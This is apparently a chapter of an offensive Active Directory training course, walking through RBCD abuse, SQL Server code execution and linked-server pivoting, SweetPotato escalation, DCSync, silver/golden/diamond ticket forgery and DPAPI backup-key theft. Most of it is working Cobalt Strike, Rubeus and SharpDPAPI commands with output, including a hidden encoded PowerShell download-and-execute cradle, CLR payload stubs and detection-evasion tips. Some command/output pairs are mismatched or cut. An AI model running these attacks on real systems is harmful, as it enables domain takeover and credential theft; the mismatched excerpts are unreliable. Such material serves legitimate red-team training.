15.6 Resource-Based Constrained Delegation

Traditional constrained delegation is configured on the front-end via msDS-AllowedToDelegateTo and requires SeEnableDelegationPrivilege (DA/EA) — the back-end has no visibility into who can delegate to it.

RBCD (Windows 2012+) inverts the control. The back-end defines which front-end accounts may delegate to it via msDS-AllowedToActOnBehalfOfOtherIdentity. Only write access to that attribute is needed — no domain admin. Configure with RSAT cmdlets:

$front = Get-ADComputer -Identity 'lon-ws-1'
$back = Get-ADComputer -Identity 'lon-fs-1'

Set-ADComputer -Identity $back -PrincipalsAllowedToDelegateToAccount $front

RBCD abuse differs from the other delegation variants — compromising the front-end does not give access to the back-end. Instead, RBCD is exploited when an adversary holds:

  1. WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity for the target back-end
  2. An account with an SPN — delegation can only be configured on accounts that bear an SPN

15.6.1 WriteProperty

Finding write access to this attribute requires its GUID. Microsoft documents the schema — ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity has GUID 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79. The PowerView query below pulls every computer and filters DACLs to ACEs targeting that GUID with WriteProperty:

PS C:\Users\Attacker> ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO\rsteel
PS C:\Users\Attacker> Get-DomainComputer -Server 10.10.120.1 -Credential $Cred | Get-DomainObjectAcl -Server 10.10.120.1 -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | select ObjectDN,SecurityIdentifier

ObjectDN                                        SecurityIdentifier
--------                                        ------------------
CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com S-1-5-21-3926355307-1661546229-813047887-1107
CN=LON-FS-1,OU=Member Servers,DC=contoso,DC=com S-1-5-21-3926355307-1661546229-813047887-1107

The SID S-1-5-21-...-1107 has the required privilege on both lon-ws-1 and lon-fs-1. Resolve the SID to its principal:

PS C:\Users\Attacker> Get-ADGroup -Filter 'objectsid -eq "S-1-5-21-3926355307-1661546229-813047887-1107"' -Server 10.10.120.1 -Credential $Cred

DistinguishedName : CN=Server Admins,CN=Users,DC=contoso,DC=com
GroupCategory     : Security
GroupScope        : Global
Name              : Server Admins
ObjectClass       : group
ObjectGUID        : 5ceea890-d8b7-47f3-918f-f6d3d040d70a
SamAccountName    : Server Admins
SID               : S-1-5-21-3926355307-1661546229-813047887-1107

Any member of Server Admins can modify the attribute on those two computers.

15.6.2 Account with an SPN

RBCD abuse also requires an account with an SPN, since delegation of any type can only be configured on SPN-bearing accounts — SPNs are foundational to Kerberos. Computer accounts always have SPNs, so a compromised workstation account is sufficient.

15.6.3 The attack

With both prerequisites satisfied, list current RBCD assignments:

PS C:\Users\Attacker> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name        PrincipalsAllowedToDelegateToAccount
----        ------------------------------------
LON-DC-1    {}
LON-WS-1    {}
LON-FS-1    {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com}
LON-WKSTN-1 {}
LON-WKSTN-2 {}

Add a computer that we have SYSTEM on (e.g. lon-wkstn-1) to lon-fs-1's allowed-to-delegate list:

PS C:\Users\Attacker> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1 -Credential $Cred

Reading the property back shows the new entry appended without overwriting the existing one:

PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name     PrincipalsAllowedToDelegateToAccount
----     ------------------------------------
LON-FS-1 {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com, CN=LON-WKSTN-1,OU=Workstations,DC=contoso,DC=com}

To access lon-fs-1, dump or request a TGT for the added principal, then run the S4U steps through Rubeus:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap

[*] Action: S4U

[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WKSTN-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF+[...snip...]4tMSQ=

[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88

15.7 Lateral Movement Services

Lateral movement uses built-in remote admin protocols to blend with legitimate traffic. Each protocol relies on different Windows services and requires different service tickets.

CIFS tickets demonstrate the technique but have limited utility — this section maps the service tickets needed for practical lateral movement and data access targets.

MethodDescriptionService Ticket(s)
SMBAccess remote filesystem (view, list, upload, delete)CIFS
PsExecRun a binary via SCMCIFS
WinRMWindows Remote ManagementHTTP
WMIExecute applications remotely (e.g. process call create)RPCSS, HOST, RestrictedKrbHost
RDPRemote Desktop ProtocolTERMSRV, HOST
MSSQLMS SQL DatabasesMSSQLSvc

15.8 Microsoft SQL Server

MS SQL (Structured Query Language) Server is Microsoft's proprietary relational database management system.

Common MS SQL tools: PowerUpSQL, SQLRecon, SQL-BOF, sqlcmd, HeidiSQL, SSMS. Examples use SQL-BOF.

15.8.1 Enumeration

SPNs

Querying for MSSQLSvc SPNs returns the hostnames of SQL Server instances and the service accounts running them — assuming the instances are configured for Kerberos authentication:

beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName

Binding to 10.10.120.1

[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*))
[*] Scope of search value: 3
[*] Returning specific attribute(s): name,samAccountName,servicePrincipalName

--------------------
name: MSSQL Service
sAMAccountName: mssql_svc
servicePrincipalName: MSSQLSvc/lon-db-1.contoso.com:1433, MSSQLSvc/lon-db-1.contoso.com

retreived 1 results total
Port scanner

When instances aren't Kerberos-configured, scan for the documented SQL Server ports instead:

beacon> portscan 10.10.120.0/23 1433 arp 1024

10.10.120.20:1433

Scanner module is complete

15.8.2 SQL server info

The depth of SQL enumeration depends on your role. SQLBrowser (UDP 1434) leaks server name, instance, and version with no role required:

beacon> sql-1434udp 10.10.120.20

SQL Server Connection Info:

ZServerName;LON-DB-1;InstanceName;MSSQLSERVER;IsClustered;No;Version;16.0.1000.6;tcp;1433;;

Without at least the public role, no further interaction is viable. With it, additional details — including the SQL Server process PID — become available:

beacon> sql-info lon-db-1

[*] Disconnecting from server

Query the current user's rights on the instance — serveradmin, securityadmin, and sysadmin are the high-value roles:

15.8.3 Querying

The public role grants permission to query the database — useful for data hunting:

beacon> sql-query lon-db-1 "SELECT @@SERVERNAME"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Executing custom query on lon-db-1

 | 
---
lon-db-1 | 

[*] Disconnecting from server

SQL-BOF provides dedicated commands for enumerating databases, tables, and rows of interest.

15.9 Code Execution

A SQL sysadmin role enables code execution on the server even without local admin. The techniques below are disabled by default on new SQL Server installations but can be enabled by a sysadmin — without sysadmin, none of them are available.

15.9.1 xp_cmdshell

xp_cmdshell is the best-known SQL Server code-execution primitive — it spawns a command shell, runs the supplied string, and returns output as rows. Syntax:

EXEC xp_cmdshell '<command>';

Check whether xp_cmdshell is enabled:

beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Executing custom query on lon-db-1

name | value | 
---------------
xp_cmdshell | 0 |

[*] Disconnecting from server

Value 0 means disabled. Enable it with sql-enablexp, which runs an sp_configure query:

beacon> sql-enablexp lon-db-1

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Toggling xp_cmdshell on lon-db-1...

name | value_in_use | 
----------------------
xp_cmdshell | 1 | 

[*] Disconnecting from server

Commands now execute under the principal running the sqlservr process — typically SYSTEM or a service account:

beacon> sql-xpcmd lon-db-1 "hostname && whoami"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] xp_cmdshell is enabled
[*] Executing system command...

output | 
---------
lon-db-1 | 
contoso\mssql_svc | 
 |

Always disable xp_cmdshell again afterwards with sql-disablexp:

beacon> sql-disablexp lon-db-1

15.9.2 OLE Automation

OLE (the foundation for COM) lets applications embed objects from other applications. OLE Automation Procedures (sp_OACreate, sp_OAMethod) let SQL Server interact with COM objects from stored procedures. Useful COM objects:

  • ScriptControl — executes arbitrary JScript or VBScript
  • WbemScripting.SWbemLocator — interacts with WMI to spawn processes
  • WScript.Shell — runs shell commands; used by the sql-olecmd BOF

Check whether OLE Automation Procedures are enabled:

beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Executing custom query on lon-db-1

name | value | 
---------------
Ole Automation Procedures | 0 | 

[*] Disconnecting from server

Enable with sql-enableole:

beacon> sql-enableole lon-db-1

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Toggling Ole Automation Procedures on lon-db-1...

name | value_in_use | 
----------------------
Ole Automation Procedures | 1 | 

[*] Disconnecting from server

Run a command with sql-olecmd. Unlike xp_cmdshell, OLE cannot return output — execution is one-shot:

beacon> sql-olecmd lon-db-1 "cmd /c calc"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] OLE Automation Procedures is enabled
[*] Executing system command...

[*] Setting sp_oacreate to "lfdfjzuv"
[*] Setting sp_oamethod to "enijbgqg"
[*] Command executed
[*] Destoryed "lfdfjzuv" and "enijbgqg"

[*] Disconnecting from server

For servers restricted from external traffic, host a payload on Cobalt Strike's web server (Attacks > Scripted Web Delivery) and deliver via a PowerShell one-liner through a reverse port forward:

PS C:\Users\Attacker> $cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'
PS C:\Users\Attacker> [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

Execute the one-liner on the target:

beacon> sql-olecmd lon-db-1 "cmd /c powershell -w hidden -nop -enc [ONE-LINER]"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] OLE Automation Procedures is enabled
[*] Executing system command...

[*] Setting sp_oacreate to "tltsphje"
[*] Setting sp_oamethod to "ckilexuf"
[*] Command executed
[*] Destoryed "tltsphje" and "ckilexuf"

[*] Disconnecting from server

Open View > Web Log to verify the hit. If absent, check the reverse port forward and the firewall rule:

04/06 15:16:43 visit (port 80) from: 127.0.0.1
	Request: GET /b
	page Scripted Web Delivery (powershell)
	null

Link to the new Beacon:

beacon> link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
[+] established link to child beacon: 10.10.120.20

Restore OLE Automation to its original state:

beacon> sql-disableole lon-db-1

15.9.3 SQL Common Language Runtime

SQL CLR (since SQL Server 2005) integrates .NET, allowing stored procedures written in C# or VB.NET. Once registered, they invoke like any native stored procedure. A C# method compatible with SQL CLR sits in a partial class named StoredProcedures and is decorated with SqlProcedureAttribute:

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        // my code here
    }
}

Any C# is fair game. For example, use the System.Diagnostics namespace to launch PowerShell:

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var psi = new ProcessStartInfo
        {
            FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            Arguments = "-w hidden -nop -enc ..."
        };
        
        Process.Start(psi);
    }
}

Or implement a complete shellcode injector via P/Invoke using one of the injection patterns covered earlier:

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        // VirtualAlloc
        // WriteProcessMemory
        // CreateThread
    }
}

Check if SQL CLR is enabled and toggle it on with sql-enableclr:

beacon> sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Executing custom query on lon-db-1

value | 
--------
0 | 

[*] Disconnecting from server

beacon> sql-enableclr lon-db-1

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Toggling clr enabled on lon-db-1...

name | value_in_use | 
----------------------
clr enabled | 1 | 

[*] Disconnecting from server

Load and execute the assembly with sql-clr:

beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Performing CLR custom assembly attack on lon-db-1

[*] CLR is enabled
[!] Error fetching results
[*] Assembly hash does not exist (error fetching result normal)
[*] Added SHA-512 hash for DLL to sys.trusted_assemblies with the name "spijufut"
[*] Creating a new custom assembly with the name "sockuoyl"
[*] Loading DLL into stored procedure "MyProcedure"
[*] Created "[sockuoyl].[StoredProcedures].[MyProcedure]"
[*] Executing payload...
[*] Cleaning up...

[*] Disconnecting from server

beacon> link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
[+] established link to child beacon: 10.10.120.20

Disable SQL CLR again with sql-disableclr:

beacon> sql-disableclr lon-db-1

15.10 Linked Servers

SQL Server links connect a SQL instance to additional data sources, including other SQL servers. Linked servers can be enumerated and abused for lateral movement. The sql-links BOF lists the configured links:

beacon> sql-links lon-db-1

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Enumerating linked servers on lon-db-1

name | product | provider | data_source | 
------------------------------------------
LON-DB-2 | SQL Server | SQLNCLI | LON-DB-2 | 

[*] Disconnecting from server

lon-db-1 has a link to lon-db-2. Query the linked server via sql-query:

beacon> sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Executing custom query on lon-db-2 via lon-db-1

 | 
---
lon-db-2 | 

[*] Disconnecting from server

Every SQL BOF supports a linkedserver option to operate across a link:

beacon> sql-whoami lon-db-1 "" lon-db-2

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Determining user permissions on lon-db-2 via lon-db-1
[*] Logged in as CONTOSO\rsteel
[*] Mapped to the user dbo
[*] Gathering roles...
 |--> User is a member of the public role
 |--> User is a member of the db_owner role
 |--> User is a member of the db_accessadmin role
 |--> User is a member of the db_securityadmin role
 |--> User is a member of the db_ddladmin role
 |--> User is a member of the db_backupoperator role
 |--> User is a member of the db_datareader role
 |--> User is a member of the db_datawriter role
 |--> User is NOT a member of the db_denydatareader role
 |--> User is NOT a member of the db_denydatawriter role
 |--> User is a member of the sysadmin role
 |--> User is a member of the setupadmin role
 |--> User is a member of the serveradmin role
 |--> User is a member of the securityadmin role
 |--> User is a member of the processadmin role
 |--> User is a member of the diskadmin role
 |--> User is a member of the dbcreator role
 |--> User is a member of the bulkadmin role

[*] Disconnecting from server

Access on the linked server depends on link configuration: hardcoded local creds, domain creds, or inherited session context. A link using the sa account grants sysadmin on the remote instance regardless of your privileges on the initial server.

If xp_cmdshell, OLE, or CLR are pre-enabled on the linked server, attack as normal. Enabling them requires RPC Out to be active on the link — without it, stored procedure calls fail.

Use sql-checkrpc to test the current state and sql-enablerpc to enable it:

beacon> sql-checkrpc lon-db-1

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Enumerating RPC status of linked servers on lon-db-1

name | is_rpc_out_enabled | 
----------------------------
lon-db-1 | 1 | 
LON-DB-2 | 0 | 

[*] Disconnecting from server

beacon> sql-enablerpc lon-db-1 lon-db-2

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Toggling RPC on lon-db-2...

is_rpc_out_enabled | 
---------------------
1 | 

[*] Disconnecting from server

Code execution then works across the link, e.g. with sql-clr:

beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure "" lon-db-2

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Performing CLR custom assembly attack on lon-db-2 via lon-db-1

[*] CLR is enabled
[*] RPC out is enabled
[!] Error fetching results
[*] Assembly hash does not exist (error fetching result normal)
[*] Added SHA-512 hash for DLL to sys.trusted_assemblies with the name "ztvnsjhj"
[*] Creating a new custom assembly with the name "ioivboaj"
[*] Loading DLL into stored procedure "MyProcedure"
[*] Created "[ioivboaj].[StoredProcedures].[MyProcedure]"
[*] Executing payload...
[*] Cleaning up...

[*] Disconnecting from server

15.11 Privilege Escalation via Service Tokens

15.11.1 SeImpersonatePrivilege

The lon-db-2 SQL instance runs under the local MSSQLSERVER service account:

beacon> getuid
[*] You are NT Service\MSSQLSERVER

Virtual service accounts access network resources as the computer account but have deliberately limited local permissions — they're not local admins. They typically hold powerful token privileges, however; enumerate with whoami /priv or Seatbelt. Privileges to look for:

  • SeImpersonatePrivilege — impersonate a client after authentication; exploitable via Potato-family tools
  • SeAssignPrimaryTokenPrivilege — assign a primary token to a new process
  • SeTcbPrivilege — act as part of the operating system

SweetPotato exploits SeImpersonatePrivilege: create a named pipe, coerce a SYSTEM process to connect, impersonate the token, spawn an arbitrary process as SYSTEM.

beacon> cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads	cp-local_x64.exe
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps	cp-local_x64.exe"

SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method PrintSpoofer to launch C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps	cp-local_x64.exe
[+] Triggering notification on evil PIPE \\lon-db-2/pipe/a708be26-b7fe-44a6-a29a-74f2583980ec
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

beacon> connect localhost 1337
[+] established link to child beacon: 10.10.120.25

15.12 Domain Dominance

Once domain admin is achieved, the adversary extracts highly-sensitive authentication material — krbtgt hash, DPAPI backup key, AD CS private key — that maintains that level of privilege almost indefinitely.

15.13 DCSync

DCs replicate directory data via the Directory Replication Service (DRS) protocol. DCSync [T1003.006] abuses DRS by impersonating a DC and requesting replication of specific objects (e.g. password hashes). Requires one of:

  • Domain or Enterprise Admin access
  • A DC computer account
  • Any principal explicitly granted the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights

Use Mimikatz' lsadump::dcsync or Beacon's dcsync alias to replicate any object from a DC. The primary target is the krbtgt hash — possession enables forging valid TGTs for any domain user (golden tickets):

beacon> dcsync contoso.com CONTOSO\krbtgt

[DC] 'contoso.com' will be the domain
[DC] 'lon-dc-1.contoso.com' will be the DC server
[DC] 'CONTOSO\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 24/01/2025 13:50:53
Object Security ID   : S-1-5-21-3926355307-1661546229-813047887-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 2d454c2120b54890b3db65406e5a5974
    ntlm- 0: 2d454c2120b54890b3db65406e5a5974
    lm  - 0: 6666c48c4b440676cfda7be586409948

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 1a8b1df83c2cdbeadba591130490e21d

* Primary:Kerberos-Newer-Keys *
    Default Salt : CONTOSO.COMkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
      aes128_hmac       (4096) : 90e173c1fedcdfeaeddb07e695b75cfa
      des_cbc_md5       (4096) : 2f2a8f347fdf94f1

Active Directory does not rotate the krbtgt password automatically — rotation is a manual process. This makes the hash an excellent candidate for long-term, high-privilege domain access.

15.13.1 OPSEC

DRS is legitimately used for replication, so its presence isn't a breach indicator on its own. Defenders look for anomalous requests — typically those originating from IPs that aren't known DCs. DS Access auditing logs replications as event 4662. Detection GUIDs:

  • 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 — DS-Replication-Get-Changes / -Get-Changes-All
  • 89e95b76-444d-4c62-991a-0facbeda640c — DS-Replication-Get-Changes-In-Filtered-Set

15.14 Ticket Forgery

Ticket forgery [T1558] uses stolen secrets to create Kerberos tickets offline and inject them into a logon session, bypassing the KDC. Three variants:

VariantTypeSigning keyAccess granted
SilverService ticket (TGS)Service account hashThe specific service on the specific host
GoldenTGTkrbtgt hashAny user / any service in the domain
DiamondTGT (modified real TGT)krbtgt hashSame as golden, with realistic peripheral fields

15.14.1 Silver Tickets

A silver ticket is a forged service ticket signed with a service's secret [T1558.002]. It targets a specific service on a specific machine. A silver ticket for CIFS built from a computer account hash gives persistent remote access without re-running the original exploit — though the ticket dies when the computer account password rotates (every 30 days by default).

Tickets are crafted offline, typically on the attacker's local machine. The example below uses the lon-db-1 computer account's AES256 hash to forge a CIFS ticket impersonating the default Domain Administrator:

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : CONTOSO.COM (CONTOSO)
[*] SID            : S-1-5-21-3926355307-1661546229-813047887
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : BC6FD6E8519B52E09F60961BEEEE083A441C25908E30A6C29B124B516E06945F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : BC6FD6E8519B52E09F60961BEEEE083A441C25908E30A6C29B124B516E06945F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256

Silver tickets are useful when combined with Kerberoasting: crack a service account's password, forge a ticket for that service impersonating a sysadmin user — even if the service account itself lacks sysadmin privileges.

First, convert the known plaintext credential into its hash equivalents:

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!

[*] Action: Calculate Password Hash(es)

[*] Input password             : Passw0rd!
[*] Input username             : mssql_svc
[*] Input domain               : CONTOSO.COM
[*] Salt                       : CONTOSO.COMmssql_svc
[*]       rc4_hmac             : FC525C9683E8FE067095BA2DDC971889
[*]       aes128_cts_hmac_sha1 : 53B5F3804FBF13E7DD624E71D18DF9BB
[*]       aes256_cts_hmac_sha1 : E4A51DAD46B6D1BA85627EEC82991C8FC94C279CE06140751E02BA015E6A21F9
[*]       des_cbc_md5          : DF91ECCDAE70BA0E

Then forge the service ticket for MSSQLSvc/lon-db-1.contoso.com:

PAC validation defeats silver tickets — the target computer validates the PAC checksum with the KDC, which fails because the ticket was signed with the computer secret instead of krbtgt. Access is denied.

Silver tickets are detectable via event correlation: legitimate ticket use produces a 4769 (TGS-REQ) on the DC followed by a 4624 (logon) on the target. Forged silver tickets skip the DC entirely — a 4624 appears on the target with no preceding 4769.

Forging accuracy matters — the Kerberos realm should be uppercase. Lowercase domain in a ticket can flag it as forged. Rubeus auto-uppercases the domain; verify other tools do the same.

15.14.2 Golden Tickets

A golden ticket is a forged TGT signed with the KDC's secret (krbtgt hash) [T1558.001]. Obtained via DCSync post-DA compromise — enables forging TGTs for any domain user, granting access to any service.

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : CONTOSO.COM (CONTOSO)
[*] SID            : S-1-5-21-3926355307-1661546229-813047887
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 512920012661247C674784EEF6E1B3BA52F64F28F57CF2B3F67246F20E6C722C
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 512920012661247C674784EEF6E1B3BA52F64F28F57CF2B3F67246F20E6C722C
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : CONTOSO.COM

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@CONTOSO.COM'

[*] AuthTime       : 04/03/2025 15:49:53
[*] StartTime      : 04/03/2025 15:49:53
[*] EndTime        : 05/03/2025 01:49:53
[*] RenewTill      : 11/03/2025 15:49:53

[*] base64(ticket.kirbi):

      doIFg[...snip...]uQ09N

Once injected, Windows uses the forged TGT to request service tickets via the standard TGS-REQ/TGS-REP flow:

beacon> make_token CONTOSO\Administrator FakePass
[+] Impersonated CONTOSO\Administrator (netonly)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFg[...snip...]uQ09N

[*] Action: Import Ticket
[+] Ticket successfully imported!

Golden ticket detection mirrors silver ticket logic: a legitimate user first generates a 4768 (AS-REP/TGT) then 4769 (TGS-REQ). A 4769 with no prior 4768 for that user indicates a forged TGT.

Mimikatz forges tickets with a 10-year lifetime by default — easily flagged against a policy maximum of 10 hours / 7-day renewal. Always set realistic ticket lifetimes when forging.

15.14.3 Diamond Tickets

A diamond ticket is functionally identical to a golden ticket but built differently. It starts from a real TGT issued by the KDC, then modifies only the PAC contents (principal, ID, groups) before re-encrypting and re-signing with the krbtgt secret. Two advantages over a fully forged TGT:

  • Peripheral ticket fields stay aligned with domain policy
  • The absence of a preceding AS-REQ is no longer detectable — one was actually performed
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap

[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/lon-dc-1.contoso.com'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: FIpY29FEAdwzu+CZG4M87n/uyXRCg6UoKecr1m3fZRE=
[+] Successfully decrypted the authenticator

15.15 DPAPI Backup Key

DPAPI encrypts secrets with a randomly generated AES masterkey, which is itself encrypted using a key derived from the user's password. Password changes break this chain — DPAPI can no longer decrypt the masterkey, making existing secrets inaccessible without the domain backup key.

AD stores a domain backup key that can decrypt any user's DPAPI masterkey. For an adversary, compromising this key allows decrypting all DPAPI-protected secrets across the entire domain.

The DPAPI backup key is generated at domain creation and never automatically rotated (no supported rotation method). Extract it from a DC (domain admin required) via the BackupKey Remote Protocol — implemented in lsadump::backupkeys (Mimikatz) and backupkey (SharpDPAPI).

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey

[*] Action: Retrieve domain DPAPI backup key

[*] Using current domain controller  : lon-dc-1.contoso.com
[*] Preferred backupkey Guid         : 12c95677-bb3d-4932-aab9-1e89c1dd005d
[*] Full preferred backupKeyName     : G$BCKUPKEY_12c95677-bb3d-4932-aab9-1e89c1dd005d
[*] Key                              : HvG1s[...snip...]lXQns=

With local admin access, an adversary can enumerate saved credentials for any user on the host. The example below shows a high-integrity session as dyork enumerating credentials stored by pchilds:

beacon> getuid
[*] You are CONTOSO\dyork (admin)

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials

[*] Action: User DPAPI Credential Triage

[*] Triaging Credentials for ALL users

Folder       : C:\Users\pchilds\AppData\Local\Microsoft\Credentials\

  CredFile           : 9CAEEF854B7702E986B47C751DFE9AD2

    guidMasterKey    : {120b3a8a-683d-4db8-8f13-e4c466949bd2}
    size             : 396
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {120b3a8a-683d-4db8-8f13-e4c466949bd2}

The /rpc method won't work here — dyork cannot recover pchilds' masterkey. Instead, use the domain backup key with the /pvk parameter:

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:HvG1s[...snip...]lXQns=

